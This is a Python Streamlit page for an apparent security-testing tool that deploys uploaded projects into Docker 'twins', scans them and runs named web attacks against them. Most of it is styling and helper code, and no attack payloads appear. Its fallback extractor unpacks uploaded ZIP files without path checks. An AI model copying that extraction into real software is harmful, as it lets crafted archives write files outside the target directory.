"""
AI-DTCTM | Digital Twin v5 — Full Production Implementation
═══════════════════════════════════════════════════════════════════════
ALL REAL TOOLS WIRED:
  • clone_and_deploy_streaming   – live Docker build pipeline
  • list_clone_files / read_clone_file / write_clone_file – live container I/O
  • inject_eicar_into_clone      – real EICAR AV-test injection
  • download_clone_as_zip        – real sandbox export
  • run_clone_attack             – real HTTP attacks (XSS/SQL/dir_enum/header_audit)
  • scan_file + deep_scan        – real forensic + deep-code analysis
  • reportlab                    – professional PDF forensic report
  • destroy_clone                – Docker container cleanup

THEME: White + Royal Blue (#2563EB) · VS Code Light IDE
"""
from __future__ import annotations

import hashlib
import io
import json
import shlex
import os
import re
import secrets
import tempfile
import threading
import time
import zipfile
from pathlib import Path
from typing import Any, Optional

import streamlit as st
import streamlit.components.v1 as components

# ─────────────────────────────────────────────────────────────────────
#  COLOUR CONSTANTS
# ─────────────────────────────────────────────────────────────────────
RB   = "#2563EB"   # Royal Blue
RBD  = "#1E40AF"   # Royal Blue Dark
RBL  = "#EFF6FF"   # Royal Blue Light bg
RBM  = "#BFDBFE"   # Royal Blue Mid border
SURF = "#FFFFFF"
BG   = "#F0F4FF"
TXD  = "#0F172A"
TXM  = "#475569"
TXS  = "#94A3B8"
GRN  = "#16A34A"
RED  = "#DC2626"
AMB  = "#D97706"

# VS Code Light IDE
VBG  = "#FFFFFF"   # editor bg
VBAR = "#F3F3F3"   # sidebar / title-bar bg
VSBA = "#ECECEC"   # tab bar
VACT = "#FFFFFF"   # active tab
VSTA = "#007ACC"   # status bar blue
VTX  = "#1E293B"   # code text
VNUM = "#A0A0A0"   # line numbers

MONO = "'JetBrains Mono','Fira Code','Cascadia Code',monospace"
SANS = "'Inter','DM Sans','Segoe UI',sans-serif"

# ─────────────────────────────────────────────────────────────────────
#  GLOBAL JOB STORE  (module-level, persists across Streamlit reruns)
# ─────────────────────────────────────────────────────────────────────
_JOBS: dict[str, dict] = {}

# ─────────────────────────────────────────────────────────────────────
#  PAGE CSS
# ─────────────────────────────────────────────────────────────────────
_CSS = f"""<style>
[data-testid="stMainBlockContainer"]{{background:{BG};padding-top:.4rem}}
[data-testid="stAppViewContainer"]{{background:{BG}}}

/* HERO */
.dth{{background:linear-gradient(135deg,{RBD} 0%,{RB} 55%,#3B82F6 100%);
  border-radius:18px;padding:32px 36px;margin-bottom:26px;
  position:relative;overflow:hidden;color:#fff;
  box-shadow:0 8px 32px rgba(37,99,235,.22)}}
.dth::before{{content:'';position:absolute;top:-55%;right:-7%;
  width:440px;height:440px;border-radius:50%;background:rgba(255,255,255,.05)}}
.dth-title{{font-family:{SANS};font-size:1.85rem;font-weight:800;
  letter-spacing:-.04em;color:#fff;line-height:1.15}}
.dth-sub{{font-family:{SANS};font-size:.92rem;color:rgba(255,255,255,.85);
  margin-top:8px;line-height:1.65;max-width:640px}}
.dth-chips{{display:flex;gap:10px;margin-top:18px;flex-wrap:wrap}}
.dth-chip{{display:inline-flex;align-items:center;gap:7px;padding:6px 14px;
  border-radius:20px;background:rgba(255,255,255,.15);
  border:1px solid rgba(255,255,255,.24);
  font-family:{MONO};font-size:.68rem;font-weight:700;
  color:#fff;letter-spacing:.06em}}
.dth-chip .dot{{width:7px;height:7px;border-radius:50%;background:#10B981;
  animation:dt-pulse 1.8s ease-in-out infinite}}

/* BOTH BADGE */
.dt-both{{display:inline-flex;align-items:center;gap:10px;
  padding:11px 20px;border-radius:10px;margin-bottom:20px;
  background:linear-gradient(90deg,{RBL},#F0FDF4);border:1px solid {RBM};
  font-family:{SANS};font-size:.88rem;color:{RBD};font-weight:700;
  box-shadow:0 2px 8px rgba(37,99,235,.08)}}

/* CLONE PROGRESS */
.dt-prog{{background:{SURF};border:1px solid {RBM};border-radius:14px;
  padding:22px 26px;margin-bottom:20px;
  box-shadow:0 2px 12px rgba(37,99,235,.07);animation:dt-fadein .4s ease-out}}
.dt-prog-hdr{{font-family:{SANS};font-size:.73rem;font-weight:700;color:{RBD};
  text-transform:uppercase;letter-spacing:.1em;margin-bottom:16px;
  display:flex;align-items:center;gap:8px}}
.dt-step{{display:flex;align-items:center;gap:14px;
  padding:10px 0;border-bottom:1px solid #F1F5F9}}
.dt-step:last-child{{border-bottom:none}}
.dt-si{{width:36px;height:36px;border-radius:50%;display:flex;
  align-items:center;justify-content:center;font-size:.9rem;flex-shrink:0}}
.si-done{{background:#DCFCE7;color:{GRN}}}
.si-active{{background:{RBL};color:{RB};animation:dt-ring 1.2s ease-in-out infinite}}
.si-wait{{background:#F8FAFC;color:{TXS};border:1.5px dashed #CBD5E1}}
.dt-step-info{{flex:1}}
.dt-step-lbl{{font-family:{SANS};font-weight:600;font-size:.9rem;color:{TXD}}}
.dt-step-sub{{font-family:{SANS};font-size:.76rem;color:{TXM};margin-top:1px}}
.dt-bar-bg{{flex:1;height:5px;background:#F1F5F9;border-radius:3px;
  overflow:hidden;max-width:180px}}
.dt-bar{{height:100%;border-radius:3px;
  background:linear-gradient(90deg,{RB},#60A5FA);transition:width .6s ease}}
.dt-bar-live{{animation:dt-shimmer 1.3s ease-in-out infinite;
  background:linear-gradient(90deg,{RB} 0%,#93C5FD 50%,{RB} 100%);
  background-size:200% 100%}}

/* VS CODE WORKBENCH SHELL */
.dt-wb-win{{background:{SURF};border:1px solid {RBM};border-radius:14px;
  overflow:hidden;margin-bottom:20px;
  box-shadow:0 4px 18px rgba(37,99,235,.09);animation:dt-fadein .45s ease-out}}
.dt-wb-titlebar{{background:{VBAR};border-bottom:1px solid #DBDBDB;
  padding:9px 16px;display:flex;align-items:center;gap:12px}}
.dt-tl{{display:flex;gap:7px}}
.dt-tl span{{width:13px;height:13px;border-radius:50%;display:block}}
.dt-tl .r{{background:#FF5F57}} .dt-tl .y{{background:#FEBC2E}}
.dt-tl .g{{background:#28C840}}
.dt-wb-fname{{font-family:{MONO};font-size:.72rem;color:#888;
  letter-spacing:.03em;flex:1;text-align:center}}
.dt-wb-body{{display:flex;min-height:500px}}

/* Explorer (left sidebar) */
.dt-explorer{{background:{VBAR};border-right:1px solid #DBDBDB;
  width:230px;flex-shrink:0;overflow-y:auto;font-family:{MONO};font-size:.77rem}}
.dt-exp-hdr{{padding:10px 14px 5px;font-size:.6rem;font-weight:700;
  color:#888;letter-spacing:.12em;text-transform:uppercase}}
.dt-dir{{padding:5px 14px;color:{TXM};
  display:flex;align-items:center;gap:6px;font-size:.74rem}}
.dt-file{{padding:5px 14px 5px 26px;color:#333;
  display:flex;align-items:center;gap:7px;
  border-left:2px solid transparent;cursor:pointer;transition:all .12s}}
.dt-file:hover{{background:#E8E8E8;color:{TXD}}}
.dt-file.dt-on{{background:#D6E4FF;border-left-color:{RB};
  color:{RBD};font-weight:600}}
.dt-file-threat{{color:{RED};font-size:.55rem;margin-left:1px}}

/* CLICKABLE FILE TREE — Streamlit buttons styled as file rows */
.dt-tree-wrap{{background:#FFFFFF;border:1px solid #E0F2FE;border-radius:10px;
  overflow:hidden;box-shadow:0 2px 8px rgba(2,132,199,0.06)}}
.dt-tree-hdr{{background:linear-gradient(135deg,#F0F9FF,#E0F2FE);
  padding:10px 14px;font-family:{MONO};font-size:.62rem;font-weight:700;
  color:#0284C7;letter-spacing:.12em;text-transform:uppercase;
  border-bottom:1px solid #E0F2FE;display:flex;align-items:center;gap:8px}}
.dt-tree-dir{{padding:7px 14px;font-family:{MONO};font-size:.72rem;
  color:#0C4A6E;font-weight:600;background:#F8FBFF;
  border-bottom:1px solid #F0F9FF;display:flex;align-items:center;gap:7px}}
/* File-row buttons — target via st-key-dttree prefix (Streamlit 1.30+) */
[class*="st-key-dttree_"] button{{
  width:100% !important;text-align:left !important;justify-content:flex-start !important;
  background:#FFFFFF !important;border:none !important;border-left:3px solid transparent !important;
  border-radius:0 !important;border-bottom:1px solid #F0F9FF !important;
  padding:8px 14px 8px 24px !important;font-family:{MONO} !important;
  font-size:.74rem !important;color:#334155 !important;font-weight:500 !important;
  transition:all .15s ease !important;box-shadow:none !important;min-height:0 !important;
}}
[class*="st-key-dttree_"] button:hover{{
  background:#F0F9FF !important;border-left-color:#7DD3FC !important;
  color:#0C4A6E !important;transform:none !important;
}}
[class*="st-key-dttree_"] button p{{
  font-family:{MONO} !important;font-size:.74rem !important;margin:0 !important;
}}
[class*="st-key-dttree_active"] button{{
  background:#E0F2FE !important;border-left-color:#0284C7 !important;
  color:#0C4A6E !important;font-weight:700 !important;
}}
[class*="st-key-dttree_active"] button p{{
  color:#0C4A6E !important;font-weight:700 !important;
}}
/* Tighten vertical gaps so file rows form a continuous tree */
[class*="st-key-dttree_"]{{margin-bottom:0 !important}}
[class*="st-key-dttree_"] [data-testid="stElementToolbar"]{{display:none !important}}

/* Code read-view → fixed-height scroll box (big files scroll INSIDE, not the page) */
[data-testid="stCode"], [data-testid="stCodeBlock"]{{
  max-height:520px !important;overflow:auto !important;
  border:1px solid #E0F2FE !important;border-top:none !important;
  border-radius:0 0 8px 8px !important;
  box-shadow:inset 0 -8px 12px -10px rgba(2,132,199,0.2) !important;
}}
[data-testid="stCode"] pre, [data-testid="stCodeBlock"] pre{{
  max-height:516px !important;overflow:auto !important;margin:0 !important;
}}
/* Slim, modern scrollbar inside the code box */
[data-testid="stCode"] pre::-webkit-scrollbar,
[data-testid="stCodeBlock"] pre::-webkit-scrollbar{{width:9px;height:9px}}
[data-testid="stCode"] pre::-webkit-scrollbar-thumb,
[data-testid="stCodeBlock"] pre::-webkit-scrollbar-thumb{{
  background:#BAE6FD;border-radius:6px}}
[data-testid="stCode"] pre::-webkit-scrollbar-thumb:hover,
[data-testid="stCodeBlock"] pre::-webkit-scrollbar-thumb:hover{{background:#7DD3FC}}

/* Editor area */
.dt-editor{{flex:1;display:flex;flex-direction:column;
  background:{VBG};overflow:hidden}}
.dt-tabs{{background:{VSBA};border-bottom:1px solid #DBDBDB;
  display:flex;overflow-x:auto;flex-shrink:0}}
.dt-tab{{padding:8px 18px;font-family:{MONO};font-size:.75rem;
  color:{TXM};border-right:1px solid #DBDBDB;white-space:nowrap;
  display:flex;align-items:center;gap:8px;cursor:pointer}}
.dt-tab.dt-ton{{color:{TXD};background:{VACT};
  border-top:2px solid {VSTA};font-weight:600}}
.dt-statusbar{{background:{VSTA};padding:4px 14px;
  display:flex;justify-content:space-between;align-items:center;
  font-family:{MONO};font-size:.63rem;color:rgba(255,255,255,.9);
  flex-shrink:0}}

/* Make text_area look like VS Code Light editor */
[data-testid="stTextArea"][data-key^="dt_ed_"] textarea{{
  font-family:{MONO} !important;font-size:.8rem !important;
  background:{VBG} !important;color:{VTX} !important;
  border:none !important;border-radius:0 !important;
  min-height:400px !important;line-height:1.75 !important;
  padding:10px 14px !important;caret-color:{VSTA} !important;
  box-shadow:none !important;resize:none !important}}
[data-testid="stTextArea"][data-key^="dt_ed_"] textarea:focus{{
  box-shadow:none !important;border:none !important}}
[data-testid="stTextArea"][data-key^="dt_ed_"] label,
[data-testid="stTextArea"][data-key^="dt_ed_"] [data-testid="InputInstructions"]{{
  display:none !important}}

/* BROWSER PREVIEW */
.dt-preview{{background:{SURF};border:1px solid {RBM};border-radius:14px;
  overflow:hidden;margin-bottom:20px;
  box-shadow:0 2px 10px rgba(37,99,235,.07)}}
.dt-prev-bar{{background:{VBAR};border-bottom:1px solid #DBDBDB;
  padding:9px 14px;display:flex;align-items:center;gap:10px}}
.dt-prev-dots{{display:flex;gap:6px}}
.dt-prev-dots span{{width:12px;height:12px;border-radius:50%;display:block}}
.dt-prev-dots .r{{background:#FF5F57}} .dt-prev-dots .y{{background:#FEBC2E}}
.dt-prev-dots .g{{background:#28C840}}
.dt-urlbar{{flex:1;background:#fff;border:1px solid #DBDBDB;border-radius:7px;
  padding:5px 14px;font-family:{MONO};font-size:.78rem;color:{TXD};
  display:flex;align-items:center;gap:8px}}
.dt-live-dot{{width:8px;height:8px;border-radius:50%;background:{GRN};
  flex-shrink:0;animation:dt-pulse 2s ease-in-out infinite}}

/* ATTACK PANEL */
.dt-atk-wrap{{background:{SURF};border:1.5px solid #FEE2E2;
  border-radius:14px;padding:22px 26px;margin-bottom:20px;
  box-shadow:0 2px 10px rgba(220,38,38,.06)}}
.dt-atk-hdr{{font-family:{SANS};font-size:.74rem;font-weight:700;
  color:{RED};text-transform:uppercase;letter-spacing:.1em;
  margin-bottom:16px;display:flex;align-items:center;gap:8px}}
.dt-atk-card{{border:1.5px solid;border-radius:12px;padding:18px 14px;
  text-align:center;transition:transform .15s,box-shadow .15s;cursor:pointer}}
.dt-atk-card:hover{{transform:translateY(-3px);box-shadow:0 6px 16px rgba(0,0,0,.10)}}
.dt-atk-icon{{font-size:1.65rem;margin-bottom:7px}}
.dt-atk-lbl{{font-family:{MONO};font-size:.72rem;font-weight:700;letter-spacing:.04em}}
.dt-atk-desc{{font-family:{SANS};font-size:.67rem;color:{TXM};
  margin-top:5px;line-height:1.4}}

/* ATTACK LOG (dark terminal) */
.dt-log{{background:#1E1E1E;border-radius:10px;padding:14px 16px;
  font-family:{MONO};font-size:.77rem;color:#D4D4D4;
  max-height:260px;overflow-y:auto;
  border:1px solid rgba(37,99,235,.18);margin-top:14px}}
.dt-log p{{margin:2px 0;line-height:1.7}}
.log-ok{{color:#4EC9B0}} .log-err{{color:#F44747}}
.log-warn{{color:#CE9178}} .log-info{{color:#9CDCFE}}
.log-crit{{color:#FF5F57;font-weight:700}}

/* KPI ROW */
.dt-kpis{{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:18px}}
.dt-kpi{{background:{SURF};border:1px solid {RBM};border-radius:10px;
  padding:14px 18px;flex:1;min-width:110px;
  box-shadow:0 1px 4px rgba(37,99,235,.06)}}
.dt-kpi-val{{font-family:{MONO};font-size:1.3rem;font-weight:700;
  color:{RB};line-height:1}}
.dt-kpi-lbl{{font-family:{SANS};font-size:.69rem;color:{TXS};
  margin-top:5px;text-transform:uppercase;letter-spacing:.07em}}

/* SECTION DIVIDER */
.dt-sec{{font-family:{SANS};font-size:.78rem;font-weight:800;color:#0C4A6E;
  text-transform:uppercase;letter-spacing:.14em;
  margin:24px 0 14px;display:flex;align-items:center;gap:12px}}
.dt-sec svg{{flex-shrink:0}}
.dt-sec::after{{content:'';flex:1;height:2px;background:linear-gradient(90deg,{RBM},transparent)}}
.dt-sec-ico{{width:32px;height:32px;background:linear-gradient(135deg,#E0F2FE,#BAE6FD);
  border-radius:8px;display:flex;align-items:center;justify-content:center;
  color:#0284C7;box-shadow:0 2px 6px rgba(2,132,199,0.15)}}
.dt-sec-ico svg{{width:18px;height:18px}}
.dt-sec-txt{{font-family:{SANS};font-size:0.85rem;font-weight:800;color:#0C4A6E;
  letter-spacing:0.02em;text-transform:none}}

/* KPI BOXES — enhanced */
.dt-kpi-val{{font-family:{SANS};font-size:1.8rem;font-weight:800;color:#0C4A6E;line-height:1}}
.dt-kpi-lbl{{font-family:{MONO};font-size:.66rem;font-weight:600;color:#0284C7;
  text-transform:uppercase;letter-spacing:.12em;margin-top:6px}}

/* PRO ICON BADGE STYLES */
.dt-pro-badge{{display:inline-flex;align-items:center;gap:6px;padding:5px 12px;
  border-radius:20px;font-family:{MONO};font-size:0.68rem;font-weight:700;
  letter-spacing:0.08em;text-transform:uppercase}}
.dt-pro-badge.live{{background:rgba(22,163,74,0.1);color:#16A34A;border:1px solid rgba(22,163,74,0.25)}}
.dt-pro-badge.warn{{background:rgba(217,119,6,0.1);color:#D97706;border:1px solid rgba(217,119,6,0.25)}}
.dt-pro-badge.crit{{background:rgba(220,38,38,0.1);color:#DC2626;border:1px solid rgba(220,38,38,0.25)}}
.dt-pro-badge .dot{{width:7px;height:7px;border-radius:50%;background:currentColor;
  animation:dt-pulse 1.8s ease-in-out infinite}}

/* DOWNLOAD */
.dt-dl{{background:linear-gradient(135deg,{RBL},#F0FDF4);
  border:1px solid {RBM};border-radius:14px;padding:26px;
  text-align:center;margin-bottom:20px}}
.dt-dl-title{{font-family:{SANS};font-size:1.1rem;font-weight:700;
  color:{TXD};margin-bottom:6px}}
.dt-dl-sub{{font-family:{SANS};font-size:.85rem;color:{TXM};
  margin-bottom:18px;line-height:1.65}}

/* FINDING CARD */
.dt-finding{{border:1px solid;border-left:3px solid;border-radius:7px;
  padding:10px 14px;margin-bottom:6px;font-family:{SANS};font-size:.82rem}}

/* ANIMATIONS */
@keyframes dt-pulse{{0%,100%{{opacity:1;transform:scale(1)}}50%{{opacity:.5;transform:scale(.8)}}}}
@keyframes dt-fadein{{from{{opacity:0;transform:translateY(8px)}}to{{opacity:1;transform:translateY(0)}}}}
@keyframes dt-shimmer{{0%{{background-position:200% 0}}100%{{background-position:-200% 0}}}}
@keyframes dt-ring{{0%,100%{{box-shadow:0 0 0 3px {RBM}}}50%{{box-shadow:0 0 0 4px {RB}}}}}

/* CLONE BUTTON ANIMATIONS */
@keyframes dt-btn-glow{{
  0%,100%{{box-shadow:0 0 0 0 rgba(2,132,199,0.5),0 4px 12px rgba(2,132,199,0.3)}}
  50%{{box-shadow:0 0 0 10px rgba(2,132,199,0),0 6px 18px rgba(2,132,199,0.45)}}
}}
@keyframes dt-btn-arrow{{
  0%,100%{{transform:translateX(0)}}
  50%{{transform:translateX(4px)}}
}}
@keyframes dt-progress-fill{{
  from{{width:0%}}
  to{{width:var(--target-width)}}
}}
@keyframes dt-progress-shimmer{{
  0%{{background-position:-200% 0}}
  100%{{background-position:200% 0}}
}}
@keyframes dt-percent-bounce{{
  0%,100%{{transform:translateY(0)}}
  50%{{transform:translateY(-2px)}}
}}
@keyframes dt-done-glow{{
  0%,100%{{box-shadow:0 0 0 0 rgba(22,163,74,0.35)}}
  50%{{box-shadow:0 0 14px 2px rgba(22,163,74,0.45)}}
}}
@keyframes dt-done-pop{{
  0%{{transform:scale(0.6);opacity:0}}
  60%{{transform:scale(1.15)}}
  100%{{transform:scale(1);opacity:1}}
}}
@keyframes dt-checkmark{{
  0%{{stroke-dashoffset:24}}
  100%{{stroke-dashoffset:0}}
}}
/* HACKER TERMINAL — typing reveal for build log */
@keyframes dt-type-in{{
  from{{max-width:0;opacity:0.4}}
  to{{max-width:100%;opacity:1}}
}}
@keyframes dt-cursor-blink{{
  0%,49%{{opacity:1}}
  50%,100%{{opacity:0}}
}}
@keyframes dt-scanline{{
  0%{{transform:translateY(-100%)}}
  100%{{transform:translateY(100%)}}
}}
@keyframes dt-glitch{{
  0%,100%{{text-shadow:0 0 0 transparent}}
  20%{{text-shadow:1px 0 0 #06B6D4,-1px 0 0 #0284C7}}
  40%{{text-shadow:-1px 0 0 #06B6D4,1px 0 0 #0284C7}}
}}

.dt-hacker-term{{
  background:linear-gradient(180deg,#0B1220 0%,#0F172A 100%);
  border:1px solid #1E40AF;border-radius:10px;padding:0;margin-bottom:18px;
  box-shadow:0 8px 24px rgba(2,132,199,0.18),inset 0 0 0 1px rgba(56,189,248,0.08);
  position:relative;overflow:hidden;
  animation:dt-fadein .4s ease-out;
}}
.dt-hacker-term::before{{
  content:'';position:absolute;left:0;right:0;top:0;height:2px;
  background:linear-gradient(90deg,transparent,#38BDF8,transparent);
  animation:dt-scanline 2.6s ease-in-out infinite;pointer-events:none;
}}
.dt-hacker-hdr{{
  display:flex;align-items:center;gap:10px;padding:9px 14px;
  background:rgba(2,132,199,0.08);border-bottom:1px solid rgba(56,189,248,0.15);
}}
.dt-hacker-hdr .dots{{display:flex;gap:6px}}
.dt-hacker-hdr .dots span{{width:11px;height:11px;border-radius:50%;display:block}}
.dt-hacker-hdr .dots .r{{background:#EF4444}}
.dt-hacker-hdr .dots .y{{background:#F59E0B}}
.dt-hacker-hdr .dots .g{{background:#10B981}}
.dt-hacker-hdr .title{{font-family:JetBrains Mono,monospace;font-size:0.68rem;
  font-weight:700;color:#38BDF8;letter-spacing:0.14em;text-transform:uppercase;
  flex:1;text-align:center;animation:dt-glitch 3.5s ease-in-out infinite;}}
.dt-hacker-hdr .badge{{font-family:JetBrains Mono,monospace;font-size:0.6rem;
  font-weight:700;color:#10B981;background:rgba(16,185,129,0.12);
  border:1px solid rgba(16,185,129,0.3);padding:2px 8px;border-radius:10px;
  letter-spacing:0.08em;display:flex;align-items:center;gap:6px}}
.dt-hacker-hdr .badge::before{{content:'';width:6px;height:6px;border-radius:50%;
  background:#10B981;animation:dt-pulse 1.4s ease-in-out infinite;}}
.dt-hacker-body{{padding:14px 18px;max-height:340px;overflow:auto;
  font-family:JetBrains Mono,monospace;font-size:0.74rem;line-height:1.7;
  color:#E5E7EB;background:#0B1220;}}
.dt-hacker-body::-webkit-scrollbar{{width:8px;height:8px}}
.dt-hacker-body::-webkit-scrollbar-thumb{{background:#1E40AF;border-radius:6px}}
.dt-hacker-line{{display:flex;align-items:baseline;gap:8px;
  overflow:hidden;white-space:nowrap;
  animation:dt-type-in 0.7s cubic-bezier(.2,.8,.2,1) both;}}
.dt-hacker-line .ln{{color:#475569;flex-shrink:0;width:32px;text-align:right;font-size:0.65rem}}
.dt-hacker-line .pr{{color:#10B981;flex-shrink:0;font-weight:700}}
.dt-hacker-line .txt{{color:#E5E7EB;overflow:hidden;text-overflow:ellipsis}}
.dt-hacker-line.ok .txt{{color:#34D399}}
.dt-hacker-line.step .txt{{color:#7DD3FC;font-weight:600}}
.dt-hacker-line.err .txt{{color:#F87171}}
.dt-hacker-line.layer .txt{{color:#A78BFA}}
.dt-hacker-line.dim .txt{{color:#94A3B8}}
.dt-hacker-cursor{{display:inline-block;width:9px;height:14px;
  background:#38BDF8;margin-left:4px;vertical-align:middle;
  animation:dt-cursor-blink 1s steps(1) infinite;}}

/* CUSTOM CLONE BUTTON HOVER */
.stButton > button[kind="primary"][data-testid*="dt_clone_btn"],
button[data-testid*="dt_clone_btn"] {{
  background:linear-gradient(135deg,#0284C7,#0369A1) !important;
  border:none !important;
  font-weight:700 !important;
  letter-spacing:0.04em !important;
  text-transform:uppercase !important;
  font-size:0.78rem !important;
  padding:11px 18px !important;
  border-radius:8px !important;
  transition:all 0.3s cubic-bezier(0.4,0,0.2,1) !important;
  animation:dt-btn-glow 2.4s ease-in-out infinite !important;
  position:relative !important;
  overflow:hidden !important;
}}
.stButton > button[kind="primary"][data-testid*="dt_clone_btn"]:hover,
button[data-testid*="dt_clone_btn"]:hover {{
  background:linear-gradient(135deg,#0369A1,#075985) !important;
  transform:translateY(-2px) !important;
  box-shadow:0 8px 24px rgba(2,132,199,0.5) !important;
  animation:none !important;
}}
.stButton > button[kind="primary"][data-testid*="dt_clone_btn"]:active,
button[data-testid*="dt_clone_btn"]:active {{
  transform:translateY(0) !important;
}}

/* OVERALL PROGRESS BAR (1-100%) */
.dt-overall{{
  background:#FFFFFF;
  border:1px solid {RBM};
  border-radius:12px;
  padding:18px 22px;
  margin-bottom:14px;
  box-shadow:0 2px 8px rgba(37,99,235,0.08);
}}
.dt-overall-hdr{{
  display:flex;
  justify-content:space-between;
  align-items:baseline;
  margin-bottom:10px;
}}
.dt-overall-lbl{{
  font-family:{SANS};
  font-size:0.72rem;
  font-weight:700;
  color:{RBD};
  text-transform:uppercase;
  letter-spacing:0.12em;
}}
.dt-overall-pct{{
  font-family:{MONO};
  font-size:1.6rem;
  font-weight:800;
  color:{RB};
  letter-spacing:-0.02em;
  animation:dt-percent-bounce 1s ease-in-out infinite;
}}
.dt-overall-pct.done{{
  color:{GRN};
  animation:none;
}}
.dt-overall-track{{
  height:10px;
  background:#F1F5F9;
  border-radius:6px;
  overflow:hidden;
  position:relative;
}}
.dt-overall-fill{{
  height:100%;
  border-radius:6px;
  background:linear-gradient(90deg,#0284C7 0%,#38BDF8 50%,#0284C7 100%);
  background-size:200% 100%;
  animation:dt-progress-shimmer 1.8s linear infinite;
  transition:width 0.5s cubic-bezier(0.4,0,0.2,1);
  position:relative;
}}
.dt-overall-fill.done{{
  background:linear-gradient(90deg,{GRN},#22C55E);
  animation:dt-done-glow 1.8s ease-in-out infinite;
}}
.dt-overall-pct.done{{
  animation:dt-done-pop 0.5s cubic-bezier(0.34,1.56,0.64,1) both;
}}
.dt-overall-fill::after{{
  content:'';
  position:absolute;
  right:0;
  top:0;
  bottom:0;
  width:20px;
  background:linear-gradient(90deg,transparent,rgba(255,255,255,0.6));
  border-radius:6px;
}}
.dt-overall-msg{{
  font-family:{MONO};
  font-size:0.72rem;
  color:{TXM};
  margin-top:8px;
  letter-spacing:0.02em;
}}
</style>"""

# ─────────────────────────────────────────────────────────────────────
#  FILE HELPERS
# ─────────────────────────────────────────────────────────────────────
_ICONS: dict[str, str] = {
    "py":"🐍","php":"🐘","js":"📜","ts":"📘","html":"🌐","htm":"🌐",
    "css":"🎨","scss":"🎨","sql":"🗃️","db":"🗄️","sh":"⚙️",
    "json":"📋","yml":"⚙️","yaml":"⚙️","xml":"📋",
    "txt":"📝","md":"📖","pdf":"📕","zip":"📦",
    "java":"☕","rb":"💎","c":"⚡","cpp":"⚡","go":"🐹","rs":"🦀",
}
_LANG: dict[str, str] = {
    "py":"python","php":"php","js":"javascript","ts":"typescript",
    "html":"html","htm":"html","css":"css","json":"json",
    "sh":"bash","sql":"sql","yml":"yaml","yaml":"yaml",
    "md":"markdown","java":"java","rb":"ruby","c":"c","cpp":"cpp",
    "go":"go","rs":"rust","xml":"xml","txt":"text",
}
_CODE_EXTS = set(_LANG.keys())

def _ext(name: str) -> str:
    return name.rsplit(".", 1)[-1].lower() if "." in name else ""

def _icon(ext: str) -> str:
    return _ICONS.get(ext.lower(), "📄")

def _lang(ext: str) -> str:
    return _LANG.get(ext.lower(), "text")

_SEV_COLOR = {
    "CRITICAL": "#DC2626", "HIGH": "#EA580C",
    "MEDIUM": "#D97706",   "LOW":  "#2563EB",
}


# ─────────────────────────────────────────────────────────────────────
#  BACKGROUND CLONE WORKER THREAD
# ─────────────────────────────────────────────────────────────────────
def _clone_worker(job_id: str, zip_path: str) -> None:
    def upd(stage: str, pct: int, msg: str, **kw: Any) -> None:
        _JOBS[job_id].update({"stage": stage, "pct": pct, "msg": msg, **kw})

    try:
        from core.source_clone import clone_and_deploy_streaming
    except ImportError as e:
        _JOBS[job_id]["error"] = f"Import failed: {e}"
        upd("error", 100, f"Import failed: {e}")
        return

    upd("extracting", 4, "Queued — waiting for Docker…")

    _stage_map = {
        "extract":    (10, "Extracting ZIP archive…"),
        "detect":     (22, "Detecting technology stack…"),
        "dockerfile": (34, "Generating Dockerfile…"),
        "build":      (40, "Building Docker image — pip/npm cache active…"),
        "run":        (88, "Launching container…"),
        "ready":      (96, "HTTP health-check…"),
    }

    result: Optional[dict] = None
    try:
        for ev in clone_and_deploy_streaming(zip_path):
            etype = ev.get("type", "")
            if etype == "stage":
                s = ev.get("stage", "")
                pct, msg = _stage_map.get(s, (50, ev.get("message", s)))
                upd(s, pct, ev.get("message", msg))
            elif etype == "progress":
                # Granular per-step progress from Docker build stream
                upd(_JOBS[job_id].get("stage", "build"),
                    ev.get("pct", _JOBS[job_id].get("pct", 40)),
                    ev.get("message", _JOBS[job_id].get("msg", "")))
            elif etype == "build_log":
                log = _JOBS[job_id].get("build_log", [])
                log.append(ev["line"])
                _JOBS[job_id]["build_log"] = log[-80:]
            elif etype == "error":
                _JOBS[job_id]["error"] = ev.get("error", "Unknown error")
                upd("error", 100, ev.get("error", ""))
                return
            elif etype == "complete":
                result = ev["result"]

        if result:
            upd("ready", 100, f"Deployed at {result.get('url','?')}")
            _JOBS[job_id]["result"] = result
        else:
            _JOBS[job_id]["error"] = "Deploy returned no result"
            upd("error", 100, "Deploy returned no result")

    except Exception as exc:
        _JOBS[job_id]["error"] = str(exc)
        upd("error", 100, str(exc))


# ─────────────────────────────────────────────────────────────────────
#  ZIP EXTRACTION  (local workbench copy)
# ─────────────────────────────────────────────────────────────────────
def _extract_zip(zip_path: str, dest: str) -> list[dict]:
    """Extract ZIP to dest using smart extractor (skips node_modules + large model files)."""
    files: list[dict] = []
    try:
        from core.source_clone import _extract_zip_smart
        _extract_zip_smart(zip_path, Path(dest))
    except Exception:
        # Fallback to plain extractall if smart extractor unavailable
        with zipfile.ZipFile(zip_path, "r") as zf:
            zf.extractall(dest)
    for root, dirs, fnames in os.walk(dest):
        dirs[:] = [d for d in dirs if not d.startswith(".") and d != "node_modules"]
        for fn in fnames:
            fpath = os.path.join(root, fn)
            rel   = os.path.relpath(fpath, dest).replace("\\", "/")
            e     = _ext(fn)
            files.append({
                "path": fpath, "rel": rel, "name": fn,
                "ext": e, "size": os.path.getsize(fpath),
                "dir": os.path.dirname(rel) or ".",
            })
    return sorted(files, key=lambda f: f["rel"])


# ─────────────────────────────────────────────────────────────────────
#  FORENSIC SCAN  (scan_file + deep_scan on the extract dir)
# ─────────────────────────────────────────────────────────────────────
def _run_initial_scan(files: list[dict], extract_dir: str) -> dict:
    """
    Run two real scanners:
      1. forensic_scanner.scan_file  → per-file OWASP patterns
      2. deep_code_scanner.deep_scan → AST-level deep analysis
    Returns unified scan state.
    """
    per_file: list[dict] = []
    try:
        from core.forensic_scanner import scan_file
        for f in files:
            if f["ext"] in _CODE_EXTS and f["size"] < 5_000_000:
                try:
                    r = scan_file(f["path"])
                    if r.get("findings"):
                        per_file.append(r)
                except Exception:
                    pass
    except Exception:
        pass

    deep: dict = {}
    try:
        from core.deep_code_scanner import deep_scan
        deep = deep_scan(extract_dir, max_findings=500)
    except Exception:
        pass

    return {
        "per_file":      per_file,
        "deep":          deep,
        "total_findings": sum(len(r.get("findings", [])) for r in per_file),
        "deep_total":    len(deep.get("findings", [])) if deep else 0,
        "files_scanned": len(per_file),
    }


# ─────────────────────────────────────────────────────────────────────
#  MAIN PAGE
# ─────────────────────────────────────────────────────────────────────
def _render_db_twin_view(state: dict) -> None:
    """Database Twin: schema explorer + deploy progress + live sqlite-web iframe."""
